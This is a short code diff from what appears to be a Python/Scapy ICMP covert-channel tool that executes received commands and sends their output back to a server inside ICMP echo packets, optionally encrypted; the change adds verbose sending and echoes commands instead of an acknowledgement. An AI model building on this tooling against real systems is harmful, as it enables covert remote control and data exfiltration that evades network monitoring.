@@ -32,7 +32,7 @@ def send_over_icmp(server, response, SSM, execute):
     if SSM: response = encrypt_decrypt(response)
     serverresponse = header + response
     evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
-    send(evil)
+    send(evil, verbose=True)
 
 # TODO Add error sending
 # Executes command and sends output
@@ -46,7 +46,7 @@ def reply(src, command, SSM):
     if command == "PING":
             send_over_icmp(src, "PONG", SSM, False)
     else:
-        send_over_icmp(src, f"ACKNOWLEDGED: {command}", SSM, False)
+        send_over_icmp(src, command, SSM, False)
 
 # Handles the icmp packets
 def handle(pkt):
